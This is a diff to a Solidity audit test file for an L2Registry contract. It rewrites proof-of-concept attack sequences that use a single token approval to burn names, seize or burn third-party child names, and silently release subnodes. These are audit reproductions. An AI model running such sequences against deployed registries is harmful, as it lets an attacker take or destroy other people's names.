@@ -11,6 +11,10 @@ import {L2Registry} from "../src/durin/L2Registry.sol";
  *
  * 950 [1] High: multicall lets a momentary holder use holder-only doors.
  * 950 [2] Medium: a two-leg round trip restores the 948/949 record wipe.
+ *
+ * v2.2 step 1 removed the public `multicall`; the shapes below are the same
+ * calls made one after another, and every claim STILL HOLDS: batching was
+ * never the reach, the approval was (Fable 950 consult §1).
  */
 contract Audit950TriageTest is Test {
     L2Registry registry;
@@ -96,12 +100,10 @@ contract Audit950TriageTest is Test {
         vm.prank(holder);
         registry.approve(attacker, uint256(node)); // a single per-token approval
 
-        bytes[] memory batch = new bytes[](2);
-        batch[0] = abi.encodeCall(registry.transferFrom, (holder, attacker, uint256(node)));
-        batch[1] = abi.encodeCall(registry.release, (node));
-
-        vm.prank(attacker);
-        registry.multicall(batch);
+        vm.startPrank(attacker);
+        registry.transferFrom(holder, attacker, uint256(node));
+        registry.release(node);
+        vm.stopPrank();
 
         assertEq(registry.owner(node), address(0), "CLAIM HOLDS: the name is burned");
     }
@@ -111,11 +113,10 @@ contract Audit950TriageTest is Test {
         bytes32 node = _mint("venue", holder);
         vm.prank(holder);
         registry.approve(attacker, uint256(node));
-        bytes[] memory batch = new bytes[](2);
-        batch[0] = abi.encodeCall(registry.transferFrom, (holder, attacker, uint256(node)));
-        batch[1] = abi.encodeCall(registry.release, (node));
-        vm.prank(attacker);
-        registry.multicall(batch);
+        vm.startPrank(attacker);
+        registry.transferFrom(holder, attacker, uint256(node));
+        registry.release(node);
+        vm.stopPrank();
 
         vm.prank(admin);
         vm.expectRevert(abi.encodeWithSignature("AdminTransferUnregistered(bytes32)", node));
@@ -133,14 +134,12 @@ contract Audit950TriageTest is Test {
         vm.prank(holder);
         registry.approve(attacker, uint256(parent));
 
-        bytes[] memory batch = new bytes[](4);
-        batch[0] = abi.encodeCall(registry.transferFrom, (holder, attacker, uint256(parent)));
-        batch[1] = abi.encodeCall(registry.parentTransfer, (childA, attacker));
-        batch[2] = abi.encodeCall(registry.release, (childB));
-        batch[3] = abi.encodeCall(registry.transferFrom, (attacker, holder, uint256(parent)));
-
-        vm.prank(attacker);
-        registry.multicall(batch);
+        vm.startPrank(attacker);
+        registry.transferFrom(holder, attacker, uint256(parent));
+        registry.parentTransfer(childA, attacker);
+        registry.release(childB);
+        registry.transferFrom(attacker, holder, uint256(parent));
+        vm.stopPrank();
 
         assertEq(registry.owner(childA), attacker, "CLAIM HOLDS: third-party name seized");
         assertEq(registry.owner(childB), address(0), "CLAIM HOLDS: third-party name burned");
@@ -153,12 +152,10 @@ contract Audit950TriageTest is Test {
         bytes[] memory none = new bytes[](0);
         bytes32 subnode = keccak256(abi.encodePacked(base, keccak256(bytes("ghost"))));
 
-        bytes[] memory batch = new bytes[](2);
-        batch[0] = abi.encodeCall(registry.createSubnode, (base, "ghost", registrar, none));
-        batch[1] = abi.encodeCall(registry.release, (subnode));
-
-        vm.prank(registrar);
-        registry.multicall(batch);
+        vm.startPrank(registrar);
+        registry.createSubnode(base, "ghost", registrar, none);
+        registry.release(subnode);
+        vm.stopPrank();
 
         assertEq(registry.owner(subnode), address(0), "CLAIM HOLDS: announced then gone, guard silent");
     }
